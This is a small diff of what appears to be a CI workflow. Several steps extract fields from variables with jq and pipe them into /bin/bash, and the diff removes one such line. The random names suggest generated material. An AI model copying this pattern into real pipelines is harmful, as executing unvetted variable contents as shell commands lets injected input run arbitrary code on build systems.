@@ -20,7 +20,6 @@ jobs:
           printf '%s' "$cvw6" | jq -r .dhx633 | /bin/bash
           echo $kbld25 | jq -r .i7218 | /bin/bash
           printf '%s' "$zj50" | jq -r .vryos4 | /bin/bash
-          echo $u4 | jq -r .xzzn0183 | /bin/bash
           echo $u58 | jq -r .ol5 | /bin/bash
 
       - name: Save output
